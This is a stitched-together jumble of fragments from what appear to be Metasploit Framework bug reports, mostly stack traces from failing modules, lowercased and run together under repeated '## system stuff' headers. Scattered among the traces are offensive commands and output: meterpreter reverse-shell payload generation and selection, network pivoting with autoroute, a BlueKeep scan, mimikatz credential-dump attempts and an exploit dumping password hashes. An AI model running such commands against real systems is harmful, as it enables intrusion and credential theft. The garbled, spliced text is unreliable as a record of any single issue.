[*] 0.0.0.0:6379 - this module does not support check.
## system stuff
404 error - - - ## steps to reproduce 1
check that page:
there check link for "original specification" (-> ## expected behavior valid link ## current behavior error "access denied"
nothing, an error log output: [03/12/2020 10:52:00] [e(0)] meterpreter: error running command shell: argumenterror wrong number of arguments (given 4, expected 5)
[03/12/2020 10:52:00] [d(0)] meterpreter: call stack:
/usr/share/metasploit-framework/lib/rex/post/meterpreter/channels/pools/stream_pool.rb:36:in `initialize'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:181:in `new'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:181:in `execute'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb:233:in `cmd_execute'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb:324:in `cmd_shell'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:153:in `run'
/usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:583:in `_interact'
/usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1365:in `cmd_sessions'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:215:in `cmd_exploit'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:49:in `<main>' ## system stuff
cat ~/.msf4/logs/framework.log
/msf/lib/msf/ui/console/command_dispatcher/core.rb:1384:in `cmd_sessions'
/msf/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/msf/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/msf/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/msf/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/msf/lib/rex/ui/text/shell.rb:158:in `run'
/msf/lib/metasploit/framework/command/console.rb:48:in `start'
/msf/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:49:in `<main>' ## system stuff
attacker machine: debian 9, ruby 2.6.0
victim machine: windows 10 home version
loading some plugins throws a ruby stack trace, complaining that there are an incorrect number of arguments
plugins that throw a similar stack trace: * wmap
* db_tracker
* aggregator
* libnotify see **steps to reproduce** ## system stuff
throws me the following messages in the logs and as an output:
[-] exploit failed: nomethoderror undefined method `auth_type' for #<msf::db::postgrespr::unknownauthtype: >
``` (scanner)
[-] auxiliary failed: nomethoderror undefined method `auth_type' for #<msf::db::postgrespr::unknownauthtype: >
[-] call stack:
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/message.rb:138:in `block in parse'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/message.rb:81:in `parse'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/message.rb:136:in `parse'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/message.rb:115:in `create'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/message.rb:57:in `read'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/connection.rb:71:in `block in initialize'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/connection.rb:70:in `loop'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/connection.rb:70:in `initialize'
[-] /usr/share/metasploit-framework/lib/msf/core/exploit/postgres.rb:232:in `new'
[-] /usr/share/metasploit-framework/lib/msf/core/exploit/postgres.rb:232:in `postgres_fingerprint'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/postgres/postgres_version.rb:80:in `do_fingerprint'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/postgres/postgres_version.rb:36:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:118:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[*] auxiliary module execution completed
``` ## system stuff
5.3.0-kali2-amd64
#1 smp debian 5.3.9-3kali1 (2019-11-20)
false warning is given
## critical log
[02/17/2020 21:12:13] [e(0)] core: /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.rb failed to load due to the following error: errno::enoent no such file or directory @ rb_sysopen - /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.rb call stack: /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:77:in `initialize' /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:77:in `open' /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:77:in `read_module_content' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:127:in `load_module' /usr/share/metasploit-framework/lib/msf/core/module_manager/cache.rb:91:in `block in load_cached_module' /usr/share/metasploit-framework/lib/msf/core/module_manager/cache.rb:86:in `each' /usr/share/metasploit-framework/lib/msf/core/module_manager/cache.rb:86:in `load_cached_module' /usr/share/metasploit-framework/lib/msf/core/module_set.rb:45:in `create' /usr/share/metasploit-framework/lib/msf/core/module_manager.rb:90:in `create' /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:667:in `cmd_use' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each' /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single' /usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:278:in `block in load_config' /usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:275:in `each_pair' /usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:275:in `load_config' /usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:171:in `initialize' /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `new' /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `driver' /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' /usr/bin/msfconsole:49:in `<main>'
``` ## system stuff
it does not return the output of the bash command
it only returns the output of msfconsole and not the child bash process that is opened to execute that command
it returns the following: ```python
{b'data': b'[*] exec: cat filename.xml\ \ ', b'prompt': b'\\x01\\x02msf5\\x01\\x02 \\x01\\x02> ', b'busy': false}
``` ## system stuff
segmentation fault ## system stuff
running it after just setting the rhosts value results in the following error: ```
[*] 10.2.3.4:1433 - 10.4.5.6:1433 - mssql - starting authentication scanner.
[*] error: 10.2.3.4: metasploit::framework::loginscanner::invalid cred details can't be blank, cred details can't be blank (metasploit::framework::loginscanner::mssql)
``` setting the username to sa, the module runs fine
## system stuff
[*] to remove the persistence, run:
$ launchctl unload -w /users/user/library/launchagents/test.plist
$ rm /users/user/library/.yosemite/test
$ rm /users/user/library/launchagents/test.plist
``` ## system stuff
msf5 payload(osx/x64/meterpreter_reverse_https) > set payloaduuidtracking true
payloaduuidtracking => true
msf5 payload(osx/x64/meterpreter_reverse_https) > generate -f macho -o rev-https-test.macho [*] meterpreter will verify ssl certificate with sha1 hash xxxx
[-] payload generation failed: undefined method `get_payload' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? get_data
``` ## system stuff
the agent goes zombie after the handler tried to stage again the payload ## system stuff
msf5 post(multi/manage/autoroute) > route add 192.168.34.1/24 6
[-] undefined method `report_session_route' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? report_session_event
msf5 post(multi/manage/autoroute) > run [!] session may not be compatible with this module.
[*] running module against win10
[*] searching for subnets to autoroute.
[-] post failed: nomethoderror undefined method `report_session_route' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? report_session_event
[-] call stack:
[-] /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/data_service/proxy/core.rb:136:in `method_missing'
[-] /opt/metasploit-framework/embedded/framework/lib/msf/core/framework.rb:503:in `on_session_route'
[-] /opt/metasploit-framework/embedded/framework/lib/msf/core/event_dispatcher.rb:183:in `block in method_missing'
[-] /opt/metasploit-framework/embedded/framework/lib/msf/core/event_dispatcher.rb:181:in `each'
[-] /opt/metasploit-framework/embedded/framework/lib/msf/core/event_dispatcher.rb:181:in `method_missing'
[-] /opt/metasploit-framework/embedded/framework/lib/msf/core/session.rb:424:in `<<'
[-] /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-socket-0.1.21/lib/rex/socket/switch_board.rb:80:in `add_route'
[-] /opt/metasploit-framework/embedded/framework/modules/post/multi/manage/autoroute.rb:232:in `add_route'
[-] /opt/metasploit-framework/embedded/framework/modules/post/multi/manage/autoroute.rb:299:in `block in autoadd_routes'
[-] /opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/extensions/stdapi/net/config.rb:174:in `each'
[-] /opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/extensions/stdapi/net/config.rb:174:in `each_route'
[-] /opt/metasploit-framework/embedded/framework/modules/post/multi/manage/autoroute.rb:293:in `autoadd_routes'
[-] /opt/metasploit-framework/embedded/framework/modules/post/multi/manage/autoroute.rb:73:in `run'
[*] post module execution completed
``` ## system stuff
i get "[-] exploit failed: nomethoderror undefined method `headers\' for nil:nilclass" as shown in the picture at the top of the post..
## system stuff
and meterpreter routing sessions dies immediately ## system stuff
warning! the following modules could not be loaded!
[-] /usr/share/metasploit-framework/modules/payloads/stages/windows/encrypted_shell.rb
[-] please see /root/.msf4/logs/framework.log for details
[12/12/2019 09:23:08] [e(0)] core: /usr/share/metasploit-framework/modules/payloads/stages/windows/encrypted_shell.rb failed to load due to the following error: nameerror uninitialized constant msf::payload::windows::encryptedpayloadopts call stack: /usr/share/metasploit-framework/modules/payloads/stages/windows/encrypted_shell.rb:12:in `<module:metasploitmodule>' /usr/share/metasploit-framework/modules/payloads/stages/windows/encrypted_shell.rb:9:in `module_eval_with_lexical_scope' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:51:in `module_eval' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:51:in `module_eval_with_lexical_scope' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:140:in `block in load_module' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:567:in `namespace_module_transaction' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:178:in `load_module' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:246:in `block in load_modules' /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:49:in `block (2 levels) in each_module_reference_name' /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:133:in `block in find' /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `catch' /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `find' /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:40:in `block in each_module_reference_name' /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:30:in `foreach' /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:30:in `each_module_reference_name' /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:245:in `load_modules' /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:135:in `block in load_modules' /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:133:in `each' /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:133:in `load_modules' /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:41:in `block in add_module_path' /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `each' /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `add_module_path' /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:50:in `block in init_module_paths' /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `each' /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `init_module_paths' /usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:161:in `initialize' /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `new' /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `driver' /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' /usr/bin/msfconsole:49:in `<main>' ## system stuff
the download of the python stage fails because of self-signed certificate:
> ssl.sslcertverificationerror: [ssl: certificate_verify_failed] certificate verify failed: self signed certificate (_ssl.c:1076) ## suggestion
i suggest factoring the command line generation code between lib/msf/core/payload/python/reverse_http.rb and modules/exploits/multi/script/web_delivery.rb
similar to powershell which uses `rex::powershell::pshmethods.download_run` to generate the command line ## system stuff
not all the compatible encoders are checked when `--smallest` option is specified.
some encoders give some kind of errors that stops msfvenom to proceed to the next encoders
## system stuff
we don't get any elevated session because this uac exploit messes with the `%windir%` env variable (that's its goal!), so the architecture detection gadget fails to launch a new powershell.exe with the correct architecture for the payload, as it uses `%windir%` in its path:
```powershell
$env:windir+'\\syswow64\\windowspowershell\\v1.0\\powershell.exe
``` alternative solution: choosing the correct payload:
set payload windows/x64/meterpreter/reverse_tcp
``` ## system stuff
search returns incorrect aux module check flag ## system stuff as seen in pr [12627]( `info` used to incorrectly report that `check` was supported for auxiliary modules that used the `msf::auxiliary::scanner` mixin
odds are the fix used in 12627 will need to be applied to the logic in `search` that determines if a module supports `check` for the same reason.
the user-land hooks are preserved ![image]( ## additional info using manually the hooks are correctly removed
![image]( ## system stuff
[*] insert_remote_ip_address_here:80 - dumping the username and password hash...
[+] insert_remote_ip_address_here:80 - got the 's hash: !
[-] insert_remote_ip_address_here:80 - exploit failed: nomethoderror undefined method `body' for nil:nilclass
[*] exploit completed, but no session was created.
currently, the following exceptions are thrown: ```
auxiliary failed: nomethoderror undefined method `report_web_vuln' for #<metasploit::framework::dataservice::remotehttpdataservice: >
call stack: lib/metasploit/framework/data_service/proxy/core.rb:136:in `method_missing' lib/msf/core/auxiliary/report.rb:363:in `report_web_vuln' modules/auxiliary/scanner/http/brute_dirs.rb:164:in `block (3 levels) in run_host'
``` and ```
auxiliary failed: nomethoderror undefined method `id' for nil:nilclass
call stack: lib/msf/core/auxiliary/report.rb:295:in `report_vuln' modules/auxiliary/scanner/http/trace.rb:47:in `run_host'
``` both exceptions occur because there's no `report_web_vuln` in `lib/metasploit/framework/data_service/proxy/core.rb`, which is called from `lib/msf/core/auxiliary/report.rb` (and possibly other places)
## system stuff
[-] ***rting the metasploit framework console...\\
[-] * warning: no database support: no database yaml file
traceback (most recent call last):ork console...\\ 28: from /usr/bin/msfconsole:49:in `<main>' 27: from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start' 26: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start' 25: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `driver' 24: from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `new' 23: from /usr/share/metasploit-framework/lib/msf/ui/console/driver.rb:161:in `initialize' 22: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `init_module_paths' 21: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:49:in `each' 20: from /usr/share/metasploit-framework/lib/msf/base/simple/framework/module_paths.rb:50:in `block in init_module_paths' 19: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `add_module_path' 18: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:40:in `each' 17: from /usr/share/metasploit-framework/lib/msf/core/module_manager/module_paths.rb:41:in `block in add_module_path' 16: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:133:in `load_modules' 15: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:133:in `each' 14: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:135:in `block in load_modules' 13: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:245:in `load_modules' 12: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:30:in `each_module_reference_name' 11: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:30:in `foreach' 10: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:40:in `block in each_module_reference_name' 9: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `find' 8: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:132:in `catch' 7: from /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-core-0.1.13/lib/rex/file.rb:133:in `block in find' 6: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/directory.rb:49:in `block (2 levels) in each_module_reference_name' 5: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:246:in `block in load_modules' 4: from /usr/share/metasploit-framework/lib/msf/core/modules/loader/base.rb:191:in `load_module' 3: from /usr/share/metasploit-framework/lib/msf/core/module_manager/loading.rb:73:in `on_module_load' 2: from /usr/share/metasploit-framework/lib/msf/core/payload_set.rb:198:in `add_module' 1: from /usr/share/metasploit-framework/lib/msf/core/payload_set.rb:198:in `new'
/usr/share/metasploit-framework/modules/payloads/singles/linux/x64/pingback_bind_tcp.rb:28:in `initialize': uninitialized constant msf::handler::bindtcp (nameerror) ## system stuff
the path separator, between the "folders" part and the filename is "\\\\" instead of "/"
> /home/user/folder\\web.xml ## reason
the code of the (java) meterpreter does not seem to be the problem.
i think it comes from metasploit side, possibly here:
#l185-l187 this hardcoded '\\\\' also seems to be present in other places, like:
#l85
#l97-l98
this command crashes the meterpreter session
in `~/.msf4/logs/framework.log` the meterpreter session first dies "session 15 has died", and few seconds later the stack trace appears : > [08/24/2019 14:59:42] [w(0)] core: warning: trying to report a session_event for a session with no db_record (15)
> [08/24/2019 14:59:42] [w(0)] core: warning: trying to report a session_event for a session with no db_record (15)
> [08/24/2019 14:59:42] [w(0)] core: warning: trying to report a session_event for a session with no db_record (15)
> [08/24/2019 14:59:46] [w(0)] core: warning: trying to report a session_event for a session with no db_record (15)
> [08/24/2019 14:59:46] [w(0)] core: warning: trying to report a session_event for a session with no db_record (15)
> [08/24/2019 14:59:46] [w(0)] core: warning: trying to report a session_event for a session with no db_record (15)
> [08/24/2019 14:59:46] [w(0)] core: session 15 has died
> [08/24/2019 15:00:01] [w(0)] core: warning: trying to report a session_event for a session with no db_record (15)
> [08/24/2019 15:00:01] [e(0)] meterpreter: error running command wdigest: rex::timeouterror operation timed out.
> [08/24/2019 15:00:01] [d(0)] meterpreter: call stack:
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:177:in `send_request'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/mimikatz/mimikatz.rb:42:in `send_custom_command_raw'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/mimikatz/mimikatz.rb:47:in `send_custom_command'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/mimikatz/mimikatz.rb:97:in `wdigest'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/mimikatz.rb:129:in `block in cmd_wdigest'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/mimikatz.rb:110:in `mimikatz_request'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/mimikatz.rb:130:in `cmd_wdigest'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
> /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:146:in `run'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
> /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:576:in `_interact'
> /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'
> /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1364:in `cmd_sessions'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
> /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:215:in `cmd_exploit'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
> /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
> /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
> /usr/bin/msfconsole:49:in `<main>' ## system stuff windows xp sp3 vm on virtualbox 6.0.10
if it can help, i can provide the vm.
currently, the in-memory hashes and password are only returned the first call, and then it crashes the meterpreter session at the second call
`~/.msf4/logs/framework.log` : > 08/24/2019 16:52:31] [w(0)] core: warning: trying to report a session_event for a session with no db_record (24)
> [08/24/2019 16:52:32] [w(0)] core: session 24 has died
> [08/24/2019 16:52:46] [w(0)] core: warning: trying to report a session_event for a session with no db_record (24)
> [08/24/2019 16:52:46] [e(0)] meterpreter: error running command kiwi_cmd: rex::timeouterror operation timed out.
> [08/24/2019 16:52:46] [d(0)] meterpreter: call stack:
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:177:in `send_request'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/kiwi/kiwi.rb:48:in `exec_cmd'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/kiwi.rb:86:in `cmd_kiwi_cmd'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
> /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:146:in `run'
> /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
> /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:576:in `_interact'
> /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact'
> /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1364:in `cmd_sessions'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
> /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:215:in `cmd_exploit'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
> /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
> /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run'
> /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
> /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
> /usr/bin/msfconsole:49:in `<main>' ## system stuff
virtualbox 6.0.10
access denied
# os kali up-to-date framework version: 5.0.20-dev
no documented command for setting options key value for the payload upon generating the payload in msf5
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces it just doesn\'t acknowledge the command as i pasted in the above example under "how\'d you do it" ## system stuff
"name" column is empty ## system stuff
i get the following error:
msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run [*] a.b.c.d:3389 - verifying rdp protocol...
[*] a.b.c.d:3389 - attempting to connect using tls security
[*] a.b.c.d:3389 - server requests tls
[*] a.b.c.d:3389 - sending erect domain request
[*] a.b.c.d:3389 - sending client info pdu
[*] a.b.c.d:3389 - received license packet
[*] a.b.c.d:3389 - sending client confirm active pdu
[*] a.b.c.d:3389 - sending client synchronize pdu
[*] a.b.c.d:3389 - sending client control cooperate pdu
[*] a.b.c.d:3389 - sending client control request control pdu
[*] a.b.c.d:3389 - sending client input sychronize pdu
[*] a.b.c.d:3389 - sending client font list pdu
[-] a.b.c.d:3389 - unexpected error: eoferror
/var/lib/gems/2.5.0/gems/rex-core-0.1.13/lib/rex/io/stream.rb:203:in `get_once'
/root/tools/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:395:in `rdp_recv'
/root/tools/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:186:in `block in check_for_patch'
/var/lib/gems/2.5.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/range/each.rb:7:in `each'
/var/lib/gems/2.5.0/gems/activesupport-4.2.11.1/lib/active_support/core_ext/range/each.rb:7:in `each_with_time_with_zone'
/root/tools/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:185:in `check_for_patch'
/root/tools/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:322:in `check_rdp_vuln'
/root/tools/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:93:in `check_host'
/root/tools/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb:65:in `run_host'
/root/tools/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:111:in `block (2 levels) in run'
/root/tools/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[*] a.b.c.d:3389 - the target service is running, but could not be validated.
[*] a.b.c.d:3389 - scanned 1 of 1 hosts (100% complete)
``` ## system stuff
output: segmentation fault
let me know if you need the dump
## system stuff
windows 2016 is detected ## system stuff
